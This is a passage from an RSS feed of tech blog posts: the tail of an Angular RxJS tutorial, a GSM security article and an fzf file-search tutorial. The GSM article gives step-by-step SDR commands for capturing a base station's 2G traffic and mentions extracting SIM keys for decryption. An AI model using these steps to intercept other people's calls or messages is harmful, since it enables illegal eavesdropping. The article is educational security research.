<p>This creation can be pretty useful, but let's introduce transformation operators with another use case. If we don't want the list of integers but rather the list of multiples of ten we can use the Observable we just created and map the values using a transformation operator. This will enable you to transform the data emitted from the stream of the observable and create another stream from the input one.</p>
<p><img src="https://www.sipios.com/hs-fs/hubfs/Img3.png?width=1636&amp;name=Img3.png" alt="Img3" width="1636" srcset="https://www.sipios.com/hs-fs/hubfs/Img3.png?width=818&amp;name=Img3.png 818w, https://www.sipios.com/hs-fs/hubfs/Img3.png?width=1636&amp;name=Img3.png 1636w, https://www.sipios.com/hs-fs/hubfs/Img3.png?width=2454&amp;name=Img3.png 2454w, https://www.sipios.com/hs-fs/hubfs/Img3.png?width=3272&amp;name=Img3.png 3272w, https://www.sipios.com/hs-fs/hubfs/Img3.png?width=4090&amp;name=Img3.png 4090w, https://www.sipios.com/hs-fs/hubfs/Img3.png?width=4908&amp;name=Img3.png 4908w" sizes="(max-width: 1636px) 100vw, 1636px"></p>
<p>As a matter of fact, we can look at the map operator which applies a function to an entry Observable stream, and returns an Observable whose values are the output of the function applied to the entry stream values.</p>
<p>Eventually, you can use operators to stop the Observable stream. For instance, the <code>first</code> operator will complete the Observable after the first value is emitted on the stream. The <code>first</code> operator is actually enough to make an Observable behave like a Promise (which is the opposite of the purpose of this article but interesting to grasp the concept of Observables).</p>
<p><img src="https://www.sipios.com/hs-fs/hubfs/Img4.png?width=1636&amp;name=Img4.png" alt="Img4" width="1636" srcset="https://www.sipios.com/hs-fs/hubfs/Img4.png?width=818&amp;name=Img4.png 818w, https://www.sipios.com/hs-fs/hubfs/Img4.png?width=1636&amp;name=Img4.png 1636w, https://www.sipios.com/hs-fs/hubfs/Img4.png?width=2454&amp;name=Img4.png 2454w, https://www.sipios.com/hs-fs/hubfs/Img4.png?width=3272&amp;name=Img4.png 3272w, https://www.sipios.com/hs-fs/hubfs/Img4.png?width=4090&amp;name=Img4.png 4090w, https://www.sipios.com/hs-fs/hubfs/Img4.png?width=4908&amp;name=Img4.png 4908w" sizes="(max-width: 1636px) 100vw, 1636px"></p>
<p>Let's look at how we could use Observables, using them as Promises (which is the main pitfall new reactive programmers fall into).</p>
<h2>Moving to reactive programming: (unwisely) use Observables like Promises</h2>
<p><strong>The first misuse of Observables developers can make is to use them as if they were Promises thanks to the subscribe method.</strong> This method looks like a callback in which developers tend to put the behavior they will expect. Indeed one of the main pain point at first when dealing with Observables is how to manipulate the value. As Observables are lazy by nature, Angular will not calculate an observable if you do not subscribe to it, hence the reflex to subscribe, get the value and do something with it. This is exactly what callbacks are about.</p>
<p>However, as we said, unlike a Promise, Observable live through time, and contrary to callbacks, the code contained in the <code>subscribe</code> method will be executed every time the observable changes, resulting in potential side effects and memory leaks potentially.</p>
<p>Let's now look at a first piece of code that generates an (invalid) implementation of the carousel</p>
<p>The carousel dynamic is created thanks to an observable <code>interval</code>. This observable emits every 1500ms an integer. Its marble diagram is the aforementioned one.</p>
<pre><code><span>constructor(private http: HttpClient) {}</span><br><span>  search = new FormControl('');</span><br><span>  drinksCarousel = [];</span><br><span>  baseUrl = '&lt;https://www.thecocktaildb.com/api/json/v1/1/search.php?s=&gt;';</span><br><span>  ngOnInit() {</span><br><span>    this.search.valueChanges.subscribe((searchText: string) =&gt;</span><br><span>      this.http.get&lt;any&gt;(this.baseUrl + searchText).subscribe((results) =&gt; {</span><br><span>        interval(1500).subscribe((int) =&gt; {</span><br><span>          this.drinksCarousel = results.drinks.slice(int, int + 3);</span><br><span>        });</span><br><span>      })</span><br><span>    );</span><br><span>  }</span><br></code></pre>
<p><strong>We can see a first code smell here: nested subscribes.</strong> This behavior is often used to mimic callbacks as we said before but will trigger some side effects. If we type several letters, to look for "margarita" we get the following update</p>
<pre><code><span>&lt;div&gt;</span><br><span>  &lt;mat-form-field class="form-field" appearance="outline"&gt;</span><br><span>    &lt;mat-label&gt; What cocktail are you looking for? &lt;/mat-label&gt;</span><br><span>    &lt;input matInput [formControl]="search" autocomplete="off" /&gt;</span><br><span>  &lt;/mat-form-field&gt;</span><br><span>&lt;/div&gt;</span><p><span>&lt;div *ngFor="let drink of drinksCarousel" class="horizontal"&gt;</span><br><span>  &lt;app-cocktail-view</span><br><span>    [img]="drink.strDrinkThumb"</span><br><span>    [name]="drink.strDrink"</span><br><span>    [glass]="drink.strGlass"</span><br><span>    [instructions]="drink.strInstructions"</span><br><span>  &gt;&lt;/app-cocktail-view&gt;</span><br><span>&lt;/div&gt;</span></p></code></pre>
<p><img src="https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=600&amp;name=Gif5.gif" alt="Gif5" width="600" srcset="https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=300&amp;name=Gif5.gif 300w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=600&amp;name=Gif5.gif 600w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=900&amp;name=Gif5.gif 900w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=1200&amp;name=Gif5.gif 1200w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=1500&amp;name=Gif5.gif 1500w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=1800&amp;name=Gif5.gif 1800w" sizes="(max-width: 600px) 100vw, 600px"></p>
<p>What we see here is that, instead of updating the <code>drinksCarousel</code> attribute and removing the previous list of values we had with the new one freshly fetched, multiple observables coexist and affect the state of our component simultaneously.</p>
<p>To come back to our analogy of the magazine subscription, what we would like to perform is to change the magazine we subscribe to, however, with nested subscribes, our code is creating a subscription to this new magazine, without terminating the previous one.</p>
<p>Every time our source observable (the search valueChanges) changes, the code inside the subscription is executed again. A new HTTP response is received, a new interval stream is created, thus creating another state change every 1.5s. Indeed none of the subscriptions are canceled, and they stack up silently into a huge mess until your computer crashes.</p></span></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.sipios.com/blog-tech/reactive-programming-rxjs-observables-angular">https://www.sipios.com/blog-tech/reactive-programming-rxjs-observables-angular</a></em></p>]]>
            </description>
            <link>https://www.sipios.com/blog-tech/reactive-programming-rxjs-observables-angular</link>
            <guid isPermaLink="false">hacker-news-small-sites-26065016</guid>
            <pubDate>Mon, 08 Feb 2021 14:38:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Looking at GSM security 30 years later]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26064725">thread link</a>) | @8sfLes
<br/>
February 8, 2021 | https://harrisonsand.com/gsm-security/ | <a href="https://web.archive.org/web/*/https://harrisonsand.com/gsm-security/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>Looking at 2G GSM traffic three decades since its inception might not sound terribly interesting, but the protocol is still surprisingly common today. It's often used a fallback for when coverage is limited and more modern protocols aren't available, as well as for legacy IoT devices.</p><p>In Norway, Telia and Telenor are in the process of phasing our their 3G networks. At they same time they are keeping their 2G networks operational <a href="https://www.telenor.no/bedrift/iot/m2m/3g/">until at least 2025</a>. Meaning all devices that don't support VoLTE will use 2G for calls and SMS.</p><p>There are well documented security flaws in GSM, and publicly available tools to exploit them. At the same time, it has become considerably cheaper and easier to analyze GSM traffic over the past few years. Open source tools such as <a href="https://github.com/ptrkrysik/gr-gsm">gr-gsm</a> have matured, and the community has developed methods for capturing the GSM spectrum without the need for expensive SDR radios.</p><p>With less than $100 and a weekend it's possible to capture and analyze GSM traffic. With some extra effort it's possible to decrypt your own traffic, and depending on how your mobile provider has set up their network it may even be possible for somebody else to illegally decrypt traffic they don't own.</p><h3 id="the-gsm-spectrum">The GSM spectrum</h3><figure><img src="https://harrisonsand.com/content/images/2021/02/Screenshot_20210208_122702.png" alt="" srcset="https://harrisonsand.com/content/images/size/w600/2021/02/Screenshot_20210208_122702.png 600w, https://harrisonsand.com/content/images/size/w1000/2021/02/Screenshot_20210208_122702.png 1000w, https://harrisonsand.com/content/images/size/w1600/2021/02/Screenshot_20210208_122702.png 1600w, https://harrisonsand.com/content/images/2021/02/Screenshot_20210208_122702.png 1920w" sizes="(min-width: 1200px) 1200px"><figcaption>GSM spectrum, showing multiple channels</figcaption></figure><p>More often than not traffic will "hop" between different channels during a transmission. Hops occur quite quickly, every few milliseconds or so. In practice, this normally means if you're interested in looking at more than a base station's broadcast control channel (BCCH) you need a way to simultaneously capture multiple channels at once.</p><p>You can visually see the hopping in the screenshot above. Stationary control traffic is on the left, and hopping traffic is on the right. These "slices" are produced as the base stations hop between different channels during transmission.</p><p>A local tower of mine is configured to hop between ARFCN channels 57 and 112. This corresponds to downlink frequencies of 946.4 and 957.4 MHz. Channels have a bandwidth of 0.2 MHz, so that means if I want to look at both channels at once I need a radio with a bandwidth of at least 11.2 MHz (946.3 to 957.5). Keep in mind towers will be configured differently, potentially using more channels spread further apart.</p><p>Inexpensive SDRs tend to have a maximum bandwidth of about 2.4 MHz. You can overcome this limitation by using multiple radios and <a href="https://github.com/ptrkrysik/multi-rtl">multi-rtl</a>, which combines their signals together to get a larger effective bandwidth.</p><p>In my case I had access to a <a href="https://www.ettus.com/product-categories/usrp-bus-series/">USRP radio</a> that can capture up to 56 MHz of bandwidth, and that's what I'll be using for my tests. However, the core concepts are identical no matter what radio you use.</p><h3 id="other-hardware">Other hardware</h3><p>If you want to decrypt your own traffic you'll need a way to get the Kc encryption key from your SIM card. Several guides out there use a series of AT+CRSM commands that access the SIM card through the phone's modem. I have gotten this to work in the past, but many phones don't expose the modem's serial interface by default, and even if you can get access it tends to be a messy process. I prefer to use a smart card reader to pull the key from the SIM directly.</p><p>I purchased a HID OMNIKEY 6121 USB smart card reader, and some adapters from the <a href="https://piswords.aliexpress.com/store/829772">Piswords AliExpress store</a> to make it a bit less fiddly to swap SIMs in and out.</p><h3 id="software">Software</h3><p>Recent versions of Ubuntu have gr-gsm in their repositories by default. Installation on Kubuntu 20.10 was as easy as:</p><pre><code>sudo apt install gr-gsm wireshark gqrx-sdr cardpeek</code></pre><p>You'll need Wireshark for looking at traffic, gqrx if you want to visually see the spectrum, and Cardpeek for pulling keys off the SIM card.</p><p>For the USRP you'll need a bit more setup. First download the latest firmware images and then set the UHD_IMAGES_DIR environment variable.</p><pre><code>sudo uhd_images_downloader
export UHD_IMAGES_DIR=/usr/share/uhd/images</code></pre><p>Next, we configure the system so non-root users can access the radio.</p><pre><code>sudo cp /usr/lib/uhd/utils/uhd-usrp.rules /etc/udev/rules.d/
sudo udevadm control --reload-rules
sudo udevadm trigger</code></pre><p>You can test if everything is working by scanning for nearby base stations with the <code>grgsm_scanner</code> utility. It takes about a minute to start displaying data.</p><figure><img src="https://harrisonsand.com/content/images/2021/02/Screenshot_20210207_160020.png" alt="" srcset="https://harrisonsand.com/content/images/size/w600/2021/02/Screenshot_20210207_160020.png 600w, https://harrisonsand.com/content/images/size/w1000/2021/02/Screenshot_20210207_160020.png 1000w, https://harrisonsand.com/content/images/2021/02/Screenshot_20210207_160020.png 1177w"></figure><h3 id="find-the-base-station">Find the base station</h3><p>Before we can capture traffic we need to know what base station our phone is connected to. This is <em>probably</em> the station with the best signal strength, so in my scan above that would be CID 2106 on ARFCN channel 57. But to be sure lets double check.</p><p>On an iPhone you can dial <code>*3001#12345#*</code> which takes you to field test mode. Go to the "All Metrics" tab and scroll down to GSM Serving Cell Info.</p><figure><img src="https://harrisonsand.com/content/images/2021/02/21-02-07-16-25-45-1531-2.png" alt="" srcset="https://harrisonsand.com/content/images/size/w600/2021/02/21-02-07-16-25-45-1531-2.png 600w, https://harrisonsand.com/content/images/size/w1000/2021/02/21-02-07-16-25-45-1531-2.png 1000w, https://harrisonsand.com/content/images/2021/02/21-02-07-16-25-45-1531-2.png 1125w" sizes="(min-width: 720px) 720px"></figure><p>You can see that the ARFCN is set to 57, as we suspected. You can also look under "GSM Idle Config" to verify that the ci matches the CID from the scan, in this case 2106.</p><p>On Android the <a href="https://play.google.com/store/apps/details?id=com.wilysis.cellinfolite">Network Cell Info Lite</a> app provides similar information.</p><h3 id="base-station-arfcns">Base station ARFCNs</h3><p>Next, we need to find out what channels the base station is configured to use. This is so we know what frequencies to configure our capture for. A list of these channels is periodically broadcast inside the System Information Type 1 packets from the BCCH. </p><p>The <code>grgsm_livemon</code> utility allows us to monitor data from the BCCH. Use the <code>-f</code> flag to set the frequency of the base station. You can find this in the output from <code>grgsm_scanner</code>, or by using the <a href="https://www.cellmapper.net/arfcn">cellmapper.net</a> ARFCN frequency calculator. (use the downlink frequency)</p><pre><code>grgsm_livemon -f 946.4M</code></pre><p>Traffic is piped to the system's loopback interface inside UDP packets on port 4729. You can use this display filter to only show Type 1 packets: <code>gsm_a.dtap.msg_rr_type == 0x19</code>.</p><figure><img src="https://harrisonsand.com/content/images/2021/02/Screenshot_20210207_164557.png" alt="" srcset="https://harrisonsand.com/content/images/size/w600/2021/02/Screenshot_20210207_164557.png 600w, https://harrisonsand.com/content/images/size/w1000/2021/02/Screenshot_20210207_164557.png 1000w, https://harrisonsand.com/content/images/size/w1600/2021/02/Screenshot_20210207_164557.png 1600w, https://harrisonsand.com/content/images/2021/02/Screenshot_20210207_164557.png 1960w" sizes="(min-width: 1200px) 1200px"></figure><p>Looking under Cell Channel Description we can see that this base station is configured to use two ARFCNs: 57 and 112.</p><h3 id="capturing-traffic">Capturing traffic</h3><p>Using the ARFCN calculator we can see that the downlink frequencies for those channels are 946.4 and 957.4 MHz. The minimum frequency range to capture both would be 946.3 to 957.5 MHz. Adding 0.1 MHz to each end to account for the 0.2 MHz channel bandwidth.</p><p>For the capture itself, we'll use the <code>grgsm_capture</code> utility. We can use the <code>-f</code> flag to set the center frequency between our two channels, and the <code>-s</code> flag to set a sufficient sample rate / bandwidth.</p><pre><code>Usage: grgsm_capture [options] output_filename

RTL-SDR capturing app of gr-gsm.

Options:
  -h, --help            show this help message and exit
  -f FREQ, --freq=FREQ  Set frequency [default=none]
  -a ARFCN, --arfcn=ARFCN
                        Set ARFCN instead of frequency (for PCS1900 add0x8000
                        (2**15) to the ARFCN number)
  -g GAIN, --gain=GAIN  Set gain [default=30.0]
  -s SAMP_RATE, --samp-rate=SAMP_RATE
                        Set samp_rate [default=1.0M]
  -T REC_LENGTH, --rec-length=REC_LENGTH
                        Set length of recording in seconds [default=infinity]
  -p FREQ_CORR, --freq-corr=FREQ_CORR
                        Set frequency correction in ppm [default=0]

  Additional osmosdr source options:
    Options specific to a subset of SDR receivers supported by osmosdr
    source.

    -w BANDWIDTH, --bandwidth=BANDWIDTH
                        Set bandwidth [default=samp_rate]
    --bb-gain=BB_GAIN   Set baseband gain [default=20.0]
    --if-gain=IF_GAIN   Set intermediate freque gain [default=20.0]
    --ant=ANTENNA       Set antenna [default=]
    --args=DEVICE_ARGS  Set device arguments [default=]. Use --list-devices
                        the view the available devices
    -l, --list-devices  List available SDR devices, use --args to specify
                        hints
</code></pre><p>The center frequency is set to 951.9 MHz, and the sample rate / bandwidth is set to 12 MHz. Technically we could go down to 11.2 MHz, but 12 is a nice even number so that's what I'll use here. You can also configure the gain, but I found the default of 30 dBi to work fine.</p><p>If you see 0's printed in your console it means your dropping samples in the capture. This basically means your computer can't keep up with the data streaming from the SDR. A common cause of dropped samples are spikes in disk writes from the capture utility, and the disk can't save the data fast enough. Increasing the buffer on the USRP can help, which we do via the <code>--args</code> flag. You could also try capturing data with the <code>uhd_rx_cfile</code> utlity, which may perform slightly better.</p><p>If you still get dropped samples, you could also try saving capture files to the <code>/dev/shm/</code> directory. This will store the capture files in memory instead of disk, which has performance benefits. The downside here is there will be less storage space for the capture.</p><pre><code>grgsm_capture --args="uhd,num_recv_frames=1024" -f 951.9M -s 12.0M call.cfile</code></pre><p><strong>Note: </strong>Before taking the capture you need to make sure your phone is communicating over GSM/2G. Most phones let you set this within the cellular data options, though depending on your exact phone and carrier settings the option may be hidden. If you don't see the option try using a different phone. The lowest I could go on my iPhone was 3G, but Android let me set 2G. Also worth noting is that my iPhone would have automatically downgraded to 2G if I disabled 4G and was in an area without 3G coverage.</p><p>Start the capture, and Ctrl+C out once you're done. Keep in mind at this point we're just capturing the downlink traffic from the base station to the phone. Some good tests would be to either place a call or receive a text message.</p><h3 id="channelize-capture">Channelize capture</h3><p><code>call.cfile</code> is "wideband" capture that contains two ARFCNs. For further processing with gr-gsm we need to split each channel into its own capture file.</p><p>We can use the <code>grgsm_channelize</code> utility for this. Set the frequency and sample rate so they're the same as when we did the capture. At the end of the command append the list of ARFCNs to extract.</p><figure><img src="https://harrisonsand.com/content/images/2021/02/Screenshot_20210207_193136.png" alt="" srcset="https://harrisonsand.com/content/images/size/w600/2021/02/Screenshot_20210207_193136.png 600w, https://harrisonsand.com/content/images/size/w1000/2021/02/Screenshot_20210207_193136.png 1000w, https://harrisonsand.com/content/images/2021/02/Screenshot_20210207_193136.png 1113w"></figure><p>A new folder will be created that contains separate capture files for each ARFCN.</p><h3 id="analyzing-bcch-traffic">Analyzing BCCH traffic</h3><p>Now we can decode the BCCH traffic from our capture. The BCCH, or broadcast control channel is where the phone listens to get told what to do. So if you receive …</p></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://harrisonsand.com/gsm-security/">https://harrisonsand.com/gsm-security/</a></em></p>]]>
            </description>
            <link>https://harrisonsand.com/gsm-security/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26064725</guid>
            <pubDate>Mon, 08 Feb 2021 14:17:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fzf – the basics part 2 – search results]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26064675">thread link</a>) | @qmacro
<br/>
February 8, 2021 | https://qmacro.org/autodidactics/2021/02/07/fzf-the-basics-2-search-results/ | <a href="https://web.archive.org/web/*/https://qmacro.org/autodidactics/2021/02/07/fzf-the-basics-2-search-results/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><em>Here’s more of what I learned from reading the first part of the fzf README and paying attention. Now I have a better setup and understanding of the basics and how to control the appearance, it’s time to turn my attention to setting some defaults to control what I get in my search results.</em></p>

<p>In <a href="https://qmacro.org/autodidactics/2021/02/02/fzf-the-basics-1-layout/">fzf - the basics part 1 - layout</a> I shared what I learned about controlling <code>fzf</code>’s layout. In the examples I showed, based on directories and files in the <a href="https://github.com/SAP-samples/teched2020-developer-keynote">SAP TechEd 2020 Developer Keynote repository</a> (which I’ll use again in this post), <code>fzf</code> presented a total of over 17000 items from which to make my choice.</p>

<p>That’s a lot, and far more than I want to consider wading through.</p>

<p>In a pipeline context, <code>fzf</code> will present choices given to it in that pipeline, i.e. via STDIN, like this:</p>

<div><div><pre><code><span>;</span> <span>printf</span> <span>"one</span><span>\n</span><span>two</span><span>\n</span><span>three"</span> | fzf <span>--layout</span><span>=</span>reverse <span>--height</span><span>=</span>40%
<span>&gt;</span>
  3/3
<span>&gt;</span> one
  two
  three
</code></pre></div></div>

<blockquote>
  <p>Interestingly, to copy/paste this example from my terminal, I had to (discover and) use the <code>--no-mouse</code> option from the Interface category so that the mouse was free to use and not locked to <code>fzf</code> during that moment.</p>
</blockquote>

<p>But I want to think about using <code>fzf</code> in a pipeline at another time; right now I’m just digging into options where <code>fzf</code> is used without receiving anything on STDIN.</p>

<p><a name="default-command"></a>
<strong>Default command</strong></p>

<p>So what does <code>fzf</code> do if it’s not fed anything to display via STDIN? Well, the README states that unless otherwise directed, <code>fzf</code> uses the <code>find</code> command to build the list of items. The actual sentence in the <a href="https://github.com/junegunn/fzf#usage">Usage</a> section reads as follows:</p>

<p><em>“Without STDIN pipe, fzf will use find command to fetch the list of files excluding hidden ones.”</em></p>

<p>At first, I stopped reading after “fzf will use find command to fetch the list of files”, and missed the “excluding hidden ones”.</p>

<p><a name="basic-uses-of-find"></a>
<strong>Basic uses of <code>find</code></strong></p>

<p>That careless omission did cause me a pleasant coffee length digression into the nuances of basic uses of the <code>find</code> command. I created a set of test files and directories like this, some hidden, some not, as you can see:</p>

<div><div><pre><code><span>.</span>
├── Fruit
│&nbsp;&nbsp; ├── apple
│&nbsp;&nbsp; ├── banana
│&nbsp;&nbsp; ├── cherry
│&nbsp;&nbsp; └── .damson
├── .Trees
│&nbsp;&nbsp; ├── ash
│&nbsp;&nbsp; └── birch
├── aardvark
├── badger
└── .cow
</code></pre></div></div>

<p>If pressed, I’d say that I’d naturally use the following incantation as a basic way to find files and directories: <code>find . -type f</code>. The results are interesting.</p>

<blockquote>
  <p>In all the following examples, I’m in the directory denoted by <code>.</code> at the top of the tree as shown above. The <code>;</code> is my simple prompt (inspired by <a href="https://twitter.com/thingskatedid">Kate</a>), with my directory location shown in a line above that (<code># /tmp/testdir</code>).</p>
</blockquote>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> find <span>.</span> <span>-type</span> f
./Fruit/apple
./Fruit/cherry
./Fruit/.damson
./Fruit/banana
./.cow
./aardvark
./.Trees/birch
./.Trees/ash
./badger
<span># /tmp/testdir</span>
<span>;</span>
</code></pre></div></div>

<p>(9 entries)</p>

<p>I’d always considered that the “default” behaviour, but on reflection, it’s arguably not default, as I’m using something specific (<code>.</code>) as the first argument to <code>find</code>, whereas I could just as easily have used <code>*</code>, thus:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> find <span>*</span> <span>-type</span> f
Fruit/apple
Fruit/cherry
Fruit/.damson
Fruit/banana
aardvark
badger
<span># /tmp/testdir</span>
<span>;</span>
</code></pre></div></div>

<p>(6 entries)</p>

<p>That’s quite a difference! The Stack Overflow entry <a href="https://stackoverflow.com/questions/46578534/difference-between-find-and-find-in-unix">Difference between find . and find * in unix</a> confirms that difference.</p>

<ul>
  <li>passing <code>.</code> results in everything in <code>.</code> being found, including the hidden file <code>.cow</code> and the hidden directory (and its contents) <code>.Trees/</code></li>
  <li>passing <code>*</code> results in only the “visible” content in <code>.</code> being returned; note that this visibility difference only applies to the starting directory in question - as <code>Fruit/.damson</code> was reported even though <code>.cow</code> and <code>.Trees/</code> weren’t</li>
</ul>

<p>So I wonder if either of these two incantations are what <code>fzf</code> uses by default. Let’s see what <code>fzf</code> gives, in this same starting directory:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> fzf <span>--height</span><span>=</span>40% <span>--reverse</span>
<span>&gt;</span>
  5/5
<span>&gt;</span> Fruit/apple
  Fruit/cherry
  Fruit/banana
  aardvark
  badger
</code></pre></div></div>

<p>(5 entries)</p>

<p>Nope!</p>

<p>Of course, there’s that “excluding hidden ones” phrase from the README to which I must now pay attention. What I need is to tell <code>find</code> explicitly to exclude hidden files and directories. This will do the trick:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> find <span>.</span> <span>-type</span> f <span>-not</span> <span>-path</span> <span>'*/\.*'</span>
./Fruit/apple
./Fruit/cherry
./Fruit/banana
./aardvark
./badger
<span># /tmp/testdir</span>
<span>;</span>
</code></pre></div></div>

<p>(5 entries)</p>

<p>That’s more like it! In fact, because we’re explicitly excluding content based on a pattern, the same results are forthcoming whether we use a <code>.</code> or <code>*</code> as the first argument to <code>find</code>. Here’s what we get with a <code>*</code>:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> find <span>*</span> <span>-type</span> f <span>-not</span> <span>-path</span> <span>'*/\.*'</span>
Fruit/apple
Fruit/cherry
Fruit/banana
aardvark
badger
<span># /tmp/testdir</span>
<span>;</span>
</code></pre></div></div>

<p>(5 entries)</p>

<p>OK, there is a subtle difference, in that in this latter case, the <code>./</code> prefix is not included in the output of each entry. This is closest to what we see with <code>fzf</code> too.</p>

<p><a name="FZF_DEFAULT_COMMAND"></a>
<strong>FZF_DEFAULT_COMMAND</strong></p>

<p>So if I wanted <code>fzf</code> to actually show me hidden files, how would I do that? Well of course one way would be to run the appropriate <code>find</code> command and then pipe the output into <code>fzf</code>, like this:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> find <span>.</span> <span>-type</span> f  | fzf <span>--height</span><span>=</span>40% <span>--reverse</span>
<span>&gt;</span>
  9/9
<span>&gt;</span> ./Fruit/apple
  ./Fruit/cherry
  ./Fruit/.damson
  ./Fruit/banana
  ./.cow
  ./aardvark
  ./.Trees/birch
  ./.Trees/ash
  ./badger
</code></pre></div></div>

<p>But I want to leave the pipeline approach until another time. Can I influence <code>fzf</code>’s search behaviour when, as the README puts it, “input is [the] tty”?</p>

<p>The answer is yes and is in the form of the environment variable <code>FZF_DEFAULT_COMMAND</code>. If set, <code>fzf</code> will use its value as the command to execute to find the files to display. So instead of using the pipeline above, I could do this:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> <span>export </span><span>FZF_DEFAULT_COMMAND</span><span>=</span><span>'find . -type f'</span>
<span># /tmp/testdir</span>
<span>;</span> fzf <span>--height</span><span>=</span>40% <span>--reverse</span>
<span>&gt;</span>
  9/9
<span>&gt;</span> ./Fruit/apple
  ./Fruit/cherry
  ./Fruit/.damson
  ./Fruit/banana
  ./.cow
  ./aardvark
  ./.Trees/birch
  ./.Trees/ash
  ./badger
</code></pre></div></div>

<p>Nice - now <code>fzf</code> shows me hidden files.</p>

<p><a name="alternative-commands"></a>
<strong>Alternative commands</strong></p>

<p>If we can modify what <code>fzf</code> uses to find files, we can go further, as the README suggests, and use another utility entirely, as described in the README’s <a href="https://github.com/junegunn/fzf#tips">Tips</a> section (and hinted at also in the <a href="https://github.com/junegunn/fzf#environment-variables">Environment variables</a> section).</p>

<p>I’ve installed the search utility <a href="https://github.com/BurntSushi/ripgrep">ripgrep</a>, known as <code>rg</code>, as it works for me in a more natural <a href="https://en.wikipedia.org/wiki/DWIM">DWIM</a> (Do What I Mean) mode.</p>

<p>Let’s see what <code>rg</code> will do for us with the same content. It is as much like <code>grep</code> than <code>find</code> and so we need to tell it to search at the file level, with <code>--files</code>, for the purposes of this exploration:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> rg <span>--files</span>
badger
aardvark
Fruit/banana
Fruit/cherry
Fruit/apple
<span># /tmp/testdir</span>
<span>;</span>
</code></pre></div></div>

<p>(5 entries)</p>

<p><code>rg</code> won’t consider hidden files and directories unless told to explicitly with <code>--hidden</code>:</p>

<div><div><pre><code># /tmp/testdir
; rg --files --hidden
badger
.Trees/ash
.Trees/birch
aardvark
.cow
Fruit/banana
Fruit/.damson
Fruit/cherry
Fruit/apple
# /tmp/testdir
;
</code></pre></div></div>

<p>(9 entries)</p>

<p>At this level, <code>rg</code> delivers results similar to what we already get with <code>find</code>.</p>

<p><a name="respecting-.gitignore"></a>
<strong>Respecting .gitignore</strong></p>

<p>Where <code>rg</code> comes into its own, DWIM-like, is when the search in question is within a git repository. In that case, it will respect what you have in your <a href="https://git-scm.com/docs/gitignore"><code>.gitignore</code></a> file.</p>

<p>I was curious to see this in action in the context of the simple set of files above. I added a <code>.gitignore</code> file in <code>/tmp/testdir</code> containing a single entry (<code>Fruit</code>) and then ran both <code>find . -type f -not -path '*/\.*'</code> and <code>rg --files</code>:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> <span>cat</span> .gitignore
Fruit
<span># /tmp/testdir</span>
<span>;</span> find <span>.</span> <span>-type</span> f <span>-not</span> <span>-path</span> <span>'*/\.*'</span>
./Fruit/apple
./Fruit/cherry
./Fruit/banana
./aardvark
./badger
<span># /tmp/testdir</span>
<span>;</span> rg <span>--files</span>
badger
aardvark
Fruit/banana
Fruit/cherry
Fruit/apple
<span># /tmp/testdir</span>
<span>;</span>
</code></pre></div></div>

<p>Hmm, so what’s going on here? They both produce the same list of files, despite the presence of the <code>.gitignore</code> file and its contents.</p>

<p>Turns out that it will only respect <code>.gitignore</code> in the context of an actual git repository, which makes sense. So a quick <code>git init</code> in the directory later, and we now see a different result for <code>rg --files</code>:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> git init
Initialized empty Git repository <span>in</span> /private/tmp/testdir/.git/
<span># /tmp/testdir (master #%)</span>
<span>;</span> rg <span>--files</span>
badger
aardvark
<span># /tmp/testdir (master #%)</span>
<span>;</span>
</code></pre></div></div>

<p>That’s more like it - the <code>Fruit/</code> directory and its contents are ignored.</p>

<p><a name="using-rg-for-real"></a>
<strong>Using rg for real</strong></p>

<p>Moving back to the <a href="https://github.com/SAP-samples/teched2020-developer-keynote">repository</a> content that I have been using to explore <code>fzf</code> in more depth (especially in <a href="https://qmacro.org/autodidactics/2021/02/02/fzf-the-basics-1-layout/">fzf - the basics part 1 - layout</a>), let’s see what effect <code>rg</code>’s respect for <code>.gitignore</code> has on the results in this more realistic scenario.</p>

<p>First, what does the incantation of <code>find</code> that most closely resembles <code>fzf</code>’s default behaviour give us from the top level of that repository?</p>

<div><div><pre><code><span># /tmp/teched2020-developer-keynote (main *=)</span>
<span>;</span> find <span>.</span> <span>-type</span> f <span>-not</span> <span>-path</span> <span>'*/\.*'</span>  | <span>wc</span> <span>-l</span>
   17688
<span># /tmp/teched2020-developer-keynote (main *=)</span>
<span>;</span>
</code></pre></div></div>

<p>OK, so that’s what we got in the <a href="https://qmacro.org/autodidactics/2021/02/02/fzf-the-basics-1-layout/">previous post</a>. The repository has a <code>.gitignore</code> file:</p>

<div><div><pre><code><span># /tmp/teched2020-developer-keynote (main *=)</span>
<span>;</span> <span>cat</span> .gitignore
node_modules/
<span>*</span>.swp
sk<span>*</span>.json
default-env.json
.DS_Store
dashboard.zip
mta_archives/
ui/resources
<span>*</span>.db-journal
<span>*</span>.token
kubeconfig.<span>*</span>
<span># /tmp/teched2020-developer-keynote (main *=)</span>
